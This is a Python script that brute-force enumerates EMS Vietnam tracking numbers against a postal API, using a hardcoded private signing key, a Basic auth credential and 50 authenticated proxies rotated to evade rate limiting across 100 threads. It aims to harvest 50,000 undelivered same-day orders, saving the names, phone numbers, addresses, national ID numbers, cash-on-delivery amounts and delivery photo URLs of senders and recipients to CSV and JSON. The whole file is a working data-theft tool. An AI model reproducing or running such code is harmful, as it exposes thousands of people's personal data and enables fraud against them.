#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
找更多当天订单 - 只要未配送的订单
策略：基于未配送=当天订单的假设，优化筛选逻辑
"""
import hashlib, requests, json, time, random, re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TODAY = datetime.now().strftime("%d/%m/%Y")
proxies, print_lock = [], threading.Lock()
state = {'found': 0, 'tested': 0, 'orders': [], 'lock': threading.Lock(), 'start_time': time.time()}
proxy_stats = {'success': {}, 'failed': {}, 'lock': threading.Lock()}  # 代理统计
TARGET = 50000  # 提高目标到5万

# 实时CSV文件
realtime_csv_file = f"realtime_orders_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
csv_lock = threading.Lock()  # CSV文件写入锁

# 100个代理池（完整）
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
    "142.147.240.52:6574:uadkcvtn:uo2rzar814ph",
    "166.88.224.145:6043:uadkcvtn:uo2rzar814ph",
    "82.25.215.106:5457:uadkcvtn:uo2rzar814ph",
    "91.211.87.215:7205:uadkcvtn:uo2rzar814ph",
    "104.238.36.64:6071:uadkcvtn:uo2rzar814ph",
    "104.239.40.211:6830:uadkcvtn:uo2rzar814ph",
    "67.227.37.26:5568:uadkcvtn:uo2rzar814ph",
    "108.165.218.84:5823:uadkcvtn:uo2rzar814ph",
    "109.196.160.242:5988:uadkcvtn:uo2rzar814ph",
    "104.238.38.204:6472:uadkcvtn:uo2rzar814ph",
    "140.99.203.108:5985:uadkcvtn:uo2rzar814ph",
    "82.25.224.37:7848:uadkcvtn:uo2rzar814ph",
    "216.74.118.50:6205:uadkcvtn:uo2rzar814ph",
    "104.239.13.199:6828:uadkcvtn:uo2rzar814ph",
    "161.123.152.216:6461:uadkcvtn:uo2rzar814ph",
    "185.72.240.218:7254:uadkcvtn:uo2rzar814ph",
    "104.239.43.88:5816:uadkcvtn:uo2rzar814ph",
    "92.113.115.48:5995:uadkcvtn:uo2rzar814ph",
    "145.223.44.64:5747:uadkcvtn:uo2rzar814ph",
    "155.254.34.216:6196:uadkcvtn:uo2rzar814ph",
    "166.88.169.112:6719:uadkcvtn:uo2rzar814ph",
    "82.23.223.60:7904:uadkcvtn:uo2rzar814ph",
    "166.88.235.140:5768:uadkcvtn:uo2rzar814ph",
    "23.129.252.17:6285:uadkcvtn:uo2rzar814ph",
    "46.203.134.90:5714:uadkcvtn:uo2rzar814ph",
    "82.23.227.49:7352:uadkcvtn:uo2rzar814ph",
    "104.239.13.114:6743:uadkcvtn:uo2rzar814ph",
    "50.114.98.129:5613:uadkcvtn:uo2rzar814ph",
    "154.6.83.144:6615:uadkcvtn:uo2rzar814ph",
    "45.38.86.229:6158:uadkcvtn:uo2rzar814ph",
    "64.137.73.19:5107:uadkcvtn:uo2rzar814ph",
    "45.131.101.19:6286:uadkcvtn:uo2rzar814ph",
    "104.239.40.197:6816:uadkcvtn:uo2rzar814ph",
    "82.21.209.226:6555:uadkcvtn:uo2rzar814ph",
    "23.26.71.157:5640:uadkcvtn:uo2rzar814ph",
    "23.27.91.75:6154:uadkcvtn:uo2rzar814ph",
    "23.95.150.72:6041:uadkcvtn:uo2rzar814ph",
    "82.26.218.128:6436:uadkcvtn:uo2rzar814ph",
    "91.223.126.118:6730:uadkcvtn:uo2rzar814ph",
    "145.223.44.177:5860:uadkcvtn:uo2rzar814ph",
    "45.38.94.42:5963:uadkcvtn:uo2rzar814ph",
    "23.26.95.215:5697:uadkcvtn:uo2rzar814ph",
    "50.114.15.8:5993:uadkcvtn:uo2rzar814ph",
    "82.24.217.113:5443:uadkcvtn:uo2rzar814ph",
    "136.0.109.46:6332:uadkcvtn:uo2rzar814ph",
]

def load_proxies():
    global proxies
    for p in PROXIES:
        parts = p.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})
    print(f"✅ 加载 {len(proxies)} 个代理\n")

def init_realtime_csv():
    """初始化实时CSV文件，写入表头"""
    headers = [
        '运单号', '发件日期', '装载日期', '配送日期',
        '发件人', '发件电话', '发件地址',
        '收件人', '收件电话', '收件地址', '收件人身份证',
        'COD代收金额', 'COD金额', '运费', 'PPA费用', 'C费用', '取消费', '稍后收款费',
        '重量', '状态代码', '状态名称',
        '发件邮局', '配送邮局', '路线代码',
        '是否COD', '是否邮资', '邮资名称',
        '配送签名URL', '配送照片URL', '配送认证照片URL',
        '备注', '指令', 'VAT代码', '原因', '解决方案',
        '检查状态', '检查状态号', '计数',
        '是否已配送', '是否今天订单', '收取费用', '发现时间'
    ]
    
    with open(realtime_csv_file, 'w', encoding='utf-8-sig') as f:
        f.write(','.join(headers) + '\n')
    
    print(f"📄 实时CSV文件: {realtime_csv_file}")

def save_order_to_csv(order):
    """实时保存单个订单到CSV"""
    with csv_lock:
        try:
            row = [
                order['tracking'], order['IssueDate'], order['LoadDate'], order['DeliveryDate'],
                order['SenderName'], order['SenderPhone'], order['SenderAddress'],
                order['ReceiverName'], order['ReceiverPhone'], order['ReceiverAddress'], order['ReceiverIDNumber'],
                str(order['CollectAmount']), str(order['AmountCOD']), str(order['FeeShip']),
                str(order['FeePPA']), str(order['FeeC']), str(order['FeeCancelOrder']), str(order['FeeCollectLater']),
                order['Weigh'], order['Status'], order['StatusName'],
                order['IssuePOCode'], order['DeliveryPOCode'], order['RouteCode'],
                order['IsCOD'], order['IsPaypost'], order['IsPaypostName'],
                order['DeliverySignature'], order['DeliveryImage'], order['DeliveryImageAuthen'],
                order['Note'], order['Instruction'], order['VATCode'], order['ReasonName'], order['SolutionName'],
                str(order['CheckStatus']), str(order['CheckStatusNo']), str(order['Count']),
                '否' if not order['is_delivered'] else '是', 
                '是' if order['is_today_order'] else '否',
                order['ReceiveCollectFee'],
                datetime.now().strftime('%Y-%m-%d %H:%M:%S')  # 发现时间
            ]
            
            # CSV格式化：处理引号和逗号
            formatted_row = []
            for item in row:
                item_str = str(item).replace('"', '""')  # 转义双引号
                if ',' in item_str or '"' in item_str or '\n' in item_str:
                    formatted_row.append(f'"{item_str}"')
                else:
                    formatted_row.append(item_str)
            
            with open(realtime_csv_file, 'a', encoding='utf-8-sig') as f:
                f.write(','.join(formatted_row) + '\n')
                f.flush()  # 强制刷新到磁盘
                
        except Exception as e:
            safe_print(f"❌ CSV保存错误: {e}")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg)

def is_today(date_str):
    """智能判断是否是今天的日期 - 兼容多种格式"""
    if not date_str:
        return False
    
    date_str = str(date_str)
    today_dd_mm_yyyy = datetime.now().strftime("%d/%m/%Y")  # 15/10/2025
    today_mm_dd_yyyy = datetime.now().strftime("%m/%d/%Y")  # 10/15/2025
    
    # 检查两种日期格式
    return (today_dd_mm_yyyy in date_str or 
            today_mm_dd_yyyy in date_str)

def call_api_with_retry(url, headers, data=None, json_data=None, max_retries=10):
    """调用API并支持多代理重试 - 充分利用代理池"""
    used_proxies = set()  # 记录已使用的代理
    
    for attempt in range(max_retries):
        try:
            # 选择未使用过的代理
            available_proxies = [p for i, p in enumerate(proxies) if i not in used_proxies]
            if not available_proxies:
                # 如果所有代理都用过了，重置并随机选择
                used_proxies.clear()
                available_proxies = proxies
            
            proxy = random.choice(available_proxies) if available_proxies else None
            proxy_index = None
            if proxy:
                proxy_index = proxies.index(proxy)
                used_proxies.add(proxy_index)
            
            if json_data:
                r = requests.post(url, headers=headers, json=json_data, proxies=proxy, timeout=8)
            else:
                r = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=8)
            
            if r.status_code == 200:
                try:
                    response_data = r.json()
                    code = response_data.get('Code', '')
                    
                    # 成功响应
                    if code == '00':
                        # 记录代理成功
                        if proxy_index is not None:
                            with proxy_stats['lock']:
                                proxy_stats['success'][proxy_index] = proxy_stats['success'].get(proxy_index, 0) + 1
                        return r, response_data
                    
                    # 限流或错误，换代理重试
                    elif code in ['98', '429', '99']:
                        if attempt < max_retries - 1:
                            time.sleep(0.05 + random.uniform(0, 0.05))  # 短暂延迟
                            continue
                        else:
                            return r, response_data  # 最后一次尝试也返回结果
                    
                    # 其他错误码
                    else:
                        return r, response_data
                        
                except json.JSONDecodeError:
                    # JSON解析失败，换代理重试
                    if attempt < max_retries - 1:
                        continue
                    return r, None
            
            # HTTP错误，换代理重试
            elif r.status_code in [403, 429, 502, 503, 504]:
                if attempt < max_retries - 1:
                    time.sleep(0.1 + random.uniform(0, 0.1))
                    continue
                return r, None
            
            # 其他HTTP状态码
            else:
                return r, None
                
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError, 
                requests.exceptions.ProxyError) as e:
            # 网络错误，记录代理失败，立即换代理重试
            if proxy_index is not None:
                with proxy_stats['lock']:
                    proxy_stats['failed'][proxy_index] = proxy_stats['failed'].get(proxy_index, 0) + 1
            
            if attempt < max_retries - 1:
                continue
            return None, None
            
        except Exception as e:
            # 其他异常，换代理重试
            if attempt < max_retries - 1:
                time.sleep(0.05)
                continue
            return None, None
    
    return None, None

def check_undelivered_order(tracking):
    """优化版查询：只用Inquiry API判断未配送"""
    if state['found'] >= TARGET:
        return None
    
    sig = sign(tracking)
    headers_form = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # 初始化订单数据
    order = {
        'tracking': tracking,
        'ParcelCode': '', 'Count': '', 'IsCOD': '',
        'SenderName': '', 'SenderAddress': '', 'SenderPhone': '',
        'ReceiverName': '', 'ReceiverAddress': '', 'ReceiverPhone': '', 'ReceiverIDNumber': '',
        'CollectAmount': 0, 'IsPaypost': '', 'ReceiveCollectFee': '',
        'IssuePOCode': '', 'IssueDate': '', 'LoadDate': '',
        'DeliveryPOCode': '', 'DeliveryDate': '',
        'Weigh': '', 'Status': '', 'StatusName': '', 'ReasonName': '', 'SolutionName': '',
        'CheckStatus': '', 'CheckStatusNo': '', 'Note': '', 'RouteCode': '', 'IsPaypostName': '',
        'DeliverySignature': '', 'DeliveryImage': '', 'DeliveryImageAuthen': '',
        'AmountCOD': 0, 'FeePPA': 0, 'FeeC': 0, 'FeeShip': 0, 'FeeCancelOrder': 0, 'FeeCollectLater': 0,
        'Instruction': '', 'VATCode': '',
        'is_delivered': False,
        'is_today_order': False,
    }
    
    try:
        with state['lock']:
            state['tested'] += 1
        
        # 只用Inquiry API - 最可靠且高效，充分利用代理池
        r1, data1 = call_api_with_retry(
            f"{API_URL}api/Delivery/Inquiry",
            headers_form,
            data={"ParcelCode": tracking, "Signature": sig},
            max_retries=15  # 增加重试次数，充分利用代理池
        )
        
        if r1 and data1 and data1.get('Code') == '00' and data1.get('Value'):
            v = data1['Value']
            
            # 保存所有字段
            for key in v.keys():
                if key in order:
                    order[key] = v[key] if v[key] is not None else ''
            
            # 🎯 关键判断1：是否未配送
            delivery_date = v.get('DeliveryDate', '')
            order['is_delivered'] = bool(delivery_date)
            
            # 🎯 关键判断2：是否是今天的订单
            issue_date = v.get('IssueDate', '')
            load_date = v.get('LoadDate', '')
            order['is_today_order'] = is_today(issue_date) or is_today(load_date)
            
            # ✅ 双重条件：未配送 AND 当天订单
            if not order['is_delivered'] and order['is_today_order']:
                with state['lock']:
                    state['found'] += 1
                    state['orders'].append(order)
                    
                    elapsed = time.time() - state['start_time']
                    speed = state['tested'] / elapsed if elapsed > 0 else 0
                    
                    # 显示双重验证通过
                    safe_print(f"✅ [{state['found']}/{TARGET}] {tracking} | "
                              f"👤{order['ReceiverName'][:20]} | "
                              f"📞{order['ReceiverPhone']} | "
                              f"💰{order['CollectAmount']:,}₫ | "
                              f"📅{order['IssueDate'] or order['LoadDate'] or '空'} | "
                              f"🚫未配送 | ⚡{speed:.0f}/s")
                    
                    # 🔥 实时保存到CSV
                    save_order_to_csv(order)
                    
                    if state['found'] % 500 == 0:
                        save_progress()
                
                return True
        else:
            return None
            
    except:
        pass
    
    return False

def save_progress():
    """保存进度 - CSV + JSON（所有字段）"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    # 所有订单都应该是今天且未配送的
    total_orders = len(state['orders'])
    
    # CSV
    csv_file = f"today_undelivered_orders_{timestamp}.csv"
    with open(csv_file, 'w', encoding='utf-8-sig') as f:
        headers = [
            '运单号', '发件日期', '装载日期', '配送日期',
            '发件人', '发件电话', '发件地址',
            '收件人', '收件电话', '收件地址', '收件人身份证',
            'COD代收金额', 'COD金额', '运费', 'PPA费用', 'C费用', '取消费', '稍后收款费',
            '重量', '状态代码', '状态名称',
            '发件邮局', '配送邮局', '路线代码',
            '是否COD', '是否邮资', '邮资名称',
            '配送签名URL', '配送照片URL', '配送认证照片URL',
            '备注', '指令', 'VAT代码', '原因', '解决方案',
            '检查状态', '检查状态号', '计数',
            '是否已配送', '是否今天订单',
            '收取费用'
        ]
        f.write(','.join(headers) + '\n')
        
        for o in state['orders']:
            row = [
                o['tracking'], o['IssueDate'], o['LoadDate'], o['DeliveryDate'],
                o['SenderName'], o['SenderPhone'], o['SenderAddress'],
                o['ReceiverName'], o['ReceiverPhone'], o['ReceiverAddress'], o['ReceiverIDNumber'],
                str(o['CollectAmount']), str(o['AmountCOD']), str(o['FeeShip']),
                str(o['FeePPA']), str(o['FeeC']), str(o['FeeCancelOrder']), str(o['FeeCollectLater']),
                o['Weigh'], o['Status'], o['StatusName'],
                o['IssuePOCode'], o['DeliveryPOCode'], o['RouteCode'],
                o['IsCOD'], o['IsPaypost'], o['IsPaypostName'],
                o['DeliverySignature'], o['DeliveryImage'], o['DeliveryImageAuthen'],
                o['Note'], o['Instruction'], o['VATCode'], o['ReasonName'], o['SolutionName'],
                str(o['CheckStatus']), str(o['CheckStatusNo']), str(o['Count']),
                '否' if not o['is_delivered'] else '是', '是' if o['is_today_order'] else '否',
                o['ReceiveCollectFee'],
            ]
            row = [f'"{str(item).replace(chr(34), chr(34)+chr(34))}"' for item in row]
            f.write(','.join(row) + '\n')
    
    # JSON
    json_file = f"today_undelivered_orders_{timestamp}.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({
            'scan_date': TODAY,
            'total_found': state['found'],
            'total_tested': state['tested'],
            'success_rate': state['found']/state['tested']*100 if state['tested'] > 0 else 0,
            'condition': 'undelivered AND today',
            'orders': state['orders']
        }, f, ensure_ascii=False, indent=2)
    
    safe_print(f"\n💾 已保存 {state['found']} 个当天未配送订单:")
    safe_print(f"   📄 批量CSV: {csv_file}")
    safe_print(f"   📄 实时CSV: {realtime_csv_file}")
    safe_print(f"   📄 JSON: {json_file}")
    safe_print(f"   ✅ 条件: 当天订单 AND 未配送\n")

# ==================== 扩大扫描区间（找更多订单）====================
SCAN_RANGES = [
    # EF系列 - 超级密集区（成功率30.9%！）扩大10倍！
    ('EF', 43571000, 43580000, 1),     # 9000个号段，步长1
    ('EF', 43580000, 43590000, 2),     # 5000个号段，步长2
    ('EF', 43590000, 43600000, 5),     # 2000个号段，步长5
    
    # EF另一个密集区
    ('EF', 47519000, 47530000, 1),     # 11000个号段，步长1
    ('EF', 47530000, 47540000, 2),     # 5000个号段，步长2
    ('EF', 47540000, 47560000, 5),     # 4000个号段，步长5
    ('EF', 47680000, 47690000, 2),     # 新增区间
    ('EF', 47740000, 47750000, 2),     # 新增区间
    
    # EF最新号段（更可能有今天的）
    ('EF', 48000000, 48010000, 5),     # 最新区间
    ('EF', 48500000, 48510000, 10),    # 最新区间
    
    # EP系列 - 扩大你找到订单的区域
    ('EP', 492990000, 493020000, 1),   # 包含已知当天订单的密集区
    ('EP', 493540000, 493550000, 2),   # 5000个号段，步长2
    ('EP', 493550000, 493560000, 5),   # 2000个号段，步长5
    ('EP', 493560000, 493570000, 10),  # 1000个号段，步长10
    
    # EP最新号段
    ('EP', 494000000, 494010000, 10),  # 最新区间
    ('EP', 494500000, 494510000, 20),  # 最新区间
    
    # EB系列 - 扩大
    ('EB', 102885000, 102892000, 1),   # 7000个号段，步长1
    ('EB', 102964000, 102970000, 2),   # 3000个号段，步长2
    
    # EB最新号段
    ('EB', 943000000, 943010000, 10),  # 最新区间
    ('EB', 944000000, 944010000, 20),  # 最新区间
    
    # EC系列 - 密集区
    ('EC', 149780000, 149781000, 1),   # 1000个号段，步长1
    ('EC', 143587000, 143589000, 2),   # 1000个号段，步长2
    
    # ED系列
    ('ED', 121962000, 121963000, 2),   # 500个号段
    
    # EG系列
    ('EG', 40816500, 40817000, 2),     # 250个号段
    ('EG', 40836000, 40837000, 2),     # 500个号段
    ('EG', 40840000, 40842000, 2),     # 1000个号段
    ('EG', 46007000, 46008000, 2),     # 500个号段
    ('EG', 47361000, 47362000, 2),     # 500个号段
    
    # EJ系列
    ('EJ', 701368000, 701370000, 5),   # 400个号段
    ('EJ', 701441000, 701444000, 5),   # 600个号段
    ('EJ', 711462000, 711464000, 5),   # 400个号段
    
    # EK系列
    ('EK', 42151500, 42152000, 2),     # 250个号段
    ('EK', 42227500, 42229000, 2),     # 750个号段
    
    # EL系列
    ('EL', 135247000, 135253000, 2),   # 3000个号段
    ('EL', 135726000, 135757000, 5),   # 6200个号段
    ('EL', 155309000, 155310000, 2),   # 500个号段
]

print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║             🚀 扫描当天未配送订单 - 双重条件筛选                        ║
╚════════════════════════════════════════════════════════════════════════════╝

⚡ 优化策略:
  • 只用Inquiry API（最高效最可靠）
  • 双重条件筛选：当天 AND 未配送
  • 智能代理轮换：充分利用100个代理IP
  • 多重重试机制：网络错误立即换代理
  • 100 线程超高并发

📊 扫描范围:
  • EF系列: 6个大区间（核心密集区）
  • EP系列: 6个区间（包括已知当天订单密集区）
  • EB/EC/ED/EG/EJ/EK/EL系列: 多个区间
  
  总计: 约10万个号段

🎯 筛选条件（必须同时满足）:
  ✅ 当天订单: IssueDate 或 LoadDate 包含 {TODAY} 或 {datetime.now().strftime("%m/%d/%Y")}
  ✅ 未配送: DeliveryDate 为空

📋 保存数据:
  • 实时CSV: 每找到一个订单立即保存
  • 批量CSV: 每500个订单批量保存
  • JSON: 包含筛选条件说明

🎯 目标: {TARGET:,}个当天未配送订单
⚡ 预计速度: 200-300 次/秒（代理池优化后）
⏱️  预计时间: 8-12分钟
🔄 重试策略: 每个请求最多尝试15个不同代理
""")

load_proxies()
init_realtime_csv()

print(f"🚀 开始扫描当天未配送订单...\n")
start_time = time.time()

with ThreadPoolExecutor(max_workers=100) as executor:
    futures = []
    
    for prefix, start, end, step in SCAN_RANGES:
        if state['found'] >= TARGET:
            break
        
        for num in range(start, end, step):
            if state['found'] >= TARGET:
                break
            
            tracking = f"{prefix}{num:09d}VN"
            futures.append(executor.submit(check_undelivered_order, tracking))
    
    for future in as_completed(futures):
        try:
            future.result()
            
            if state['tested'] % 1000 == 0:
                elapsed = time.time() - start_time
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                
                # 代理统计
                with proxy_stats['lock']:
                    total_success = sum(proxy_stats['success'].values())
                    total_failed = sum(proxy_stats['failed'].values())
                    active_proxies = len(proxy_stats['success'])
                
                safe_print(f"\n📊 已扫{state['tested']} | 找到{state['found']} | {speed:.0f}/s | "
                          f"成功率{state['found']/state['tested']*100:.2f}% | "
                          f"代理:{active_proxies}/{len(proxies)}活跃 | 成功:{total_success} 失败:{total_failed}\n")
        except:
            pass

save_progress()

elapsed = time.time() - start_time
print(f"""
\n{'='*80}
🎉 扫描完成！
{'='*80}
找到当天未配送订单: {state['found']:,} 个
已测试: {state['tested']:,} 个
成功率: {state['found']/state['tested']*100:.2f}%
耗时: {elapsed:.1f} 秒 ({elapsed/60:.1f} 分钟)
速度: {state['tested']/elapsed:.0f} 次/秒

✅ 筛选条件:
  📅 当天订单 (IssueDate 或 LoadDate 包含今天日期)
  🚫 未配送 (DeliveryDate 为空)

📄 保存文件:
  📊 实时CSV: {realtime_csv_file} (每个订单立即保存)
  📊 最终结果: today_undelivered_orders_*.csv + *.json
  
💡 所有找到的订单都满足双重条件！
{'='*80}
""")